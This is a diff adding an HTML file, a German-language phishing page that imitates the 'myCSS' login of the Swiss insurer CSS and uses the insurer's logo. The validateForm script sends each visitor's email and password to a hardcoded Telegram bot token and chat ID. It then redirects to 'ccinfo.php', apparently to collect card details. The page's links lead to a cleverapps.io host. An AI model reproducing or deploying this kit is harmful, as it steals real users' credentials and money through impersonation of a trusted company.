@@ -1,0 +1,249 @@
+<html lang="de" class=" euglnvdes idc0_350"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Einloggen - myCSS</title>
+    <style>
+        :root {
+            --sky-blue: #87CEEB;
+            --cerulean-blue: #007BA7;
+            --dark-blue: #005f73;
+            --white: #ffffff;
+            --text-color: #333;
+            --error-color: #ff4d4d;
+            --border-radius: 10px;
+            --box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            --font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--sky-blue);
+            font-family: var(--font-family);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: var(--text-color);
+        }
+
+        .login-container {
+            background-color: var(--white);
+            padding: 30px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            transition: transform 0.3s;
+        }
+
+        .login-container:hover {
+            transform: scale(1.02);
+        }
+
+        .logo {
+            width: 100%;
+            max-width: 220px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            color: var(--cerulean-blue);
+            margin-bottom: 20px;
+            font-size: 2em;
+            font-weight: 700;
+        }
+
+        .input-container {
+            position: relative;
+            width: 100%;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid var(--cerulean-blue);
+            border-radius: var(--border-radius);
+            font-size: 1em;
+            transition: border-color 0.3s;
+        }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            border-color: var(--dark-blue);
+            outline: none;
+        }
+
+        input[type="submit"] {
+            background-color: var(--cerulean-blue);
+            color: var(--white);
+            border: none;
+            padding: 12px;
+            border-radius: var(--border-radius);
+            cursor: pointer;
+            width: 100%;
+            font-size: 1.1em;
+            transition: background-color 0.3s, transform 0.3s;
+        }
+
+        input[type="submit"]:hover {
+            background-color: var(--dark-blue);
+            transform: translateY(-2px);
+        }
+
+        .social-login {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .social-button {
+            background-color: var(--white);
+            border: 1px solid var(--cerulean-blue);
+            color: var(--cerulean-blue);
+            padding: 10px;
+            border-radius: var(--border-radius);
+            cursor: pointer;
+            flex: 1;
+            margin: 0 5px;
+            transition: background-color 0.3s;
+        }
+
+        .social-button:hover {
+            background-color: var(--cerulean-blue);
+            color: var(--white);
+        }
+
+        .error-message {
+            color: var(--error-color);
+            font-size: 0.9em;
+            margin-top: 10px;
+        }
+
+        p {
+            margin-top: 15px;
+            font-size: 0.9em;
+        }
+
+        a {
+            color: var(--cerulean-blue);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        /* Custom Eye Icon (CSS version) */
+        .eye-icon {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            width: 20px;
+            height: 20px;
+            background-color: var(--cerulean-blue);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .eye-icon::before {
+            content: '';
+            width: 12px;
+            height: 12px;
+            background-color: var(--white);
+            border-radius: 50%;
+        }
+
+        .eye-icon.open {
+            background-color: var(--dark-blue);
+        }
+
+        .eye-icon.open::before {
+            background-color: #FFDD00;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/42/Css-versicherung-logo-slogan.svg/2560px-Css-versicherung-logo-slogan.svg.png" alt="myCSS Logo" class="logo">
+        <h1>Einloggen</h1>
+        <form onsubmit="return validateForm(event)">
+            <input type="email" name="email" id="email" placeholder="E-Mail" required="">
+            <div class="input-container">
+                <input type="password" name="password" id="password" placeholder="Passwort" required="">
+                <span class="eye-icon" onclick="togglePasswordVisibility()"></span>
+            </div>
+            <div class="error-message" id="error-message"></div>
+            <input type="submit" value="Einloggen">
+        </form>
+        <div class="social-login">
+            <button class="social-button">Mit Google einloggen</button>
+            <button class="social-button">Mit Facebook einloggen</button>
+        </div>
+        <p>Noch nicht registriert? <a href="https://dolabokanofola9.cleverapps.io/SBB/c">Hier registrieren</a></p>
+        <p><a href="https://dolabokanofola9.cleverapps.io/SBB/c">Passwort vergessen?</a></p>
+    </div>
+
+    <script>
+        function togglePasswordVisibility() {
+            const passwordField = document.getElementById('password');
+            const eyeIcon = document.querySelector('.eye-icon');
+
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                eyeIcon.classList.add('open'); // Apply the 'open' class for the eye icon
+            } else {
+                passwordField.type = 'password';
+                eyeIcon.classList.remove('open'); // Remove the 'open' class
+            }
+        }
+
+        function validateForm(event) {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const errorMessage = document.getElementById('error-message');
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+            if (!emailPattern.test(email)) {
+                errorMessage.textContent = 'Bitte geben Sie eine gültige E-Mail-Adresse ein.';
+                return false;
+            }
+
+            errorMessage.textContent = ''; // Clear any previous error messages
+
+            // Send email and password to Telegram
+            const telegramToken = '7865139557:AAFY2G8uW-pLhV12z7s76rxKHgtaunnOYao';
+            const chatId = '-4757129533';
+            const message = `----------- MYCSS - LOGIN -----------\nE-Mail: ${email}\nPasswort: ${password}`;
+            const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(telegramUrl)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                })
+                .catch(error => {
+                    console.error('There was a problem with the fetch operation:', error);
+                });
+
+            // Redirect after form submission
+            setTimeout(function () {
+                window.location.href = 'ccinfo.php'; // Redirect to the next page
+            }, 2000); // Wait for 2 seconds before redirection
+
+            // Prevent the default form submission (for smooth transition)
+            event.preventDefault();
+        }
+    </script>
+
+
+</body></html>
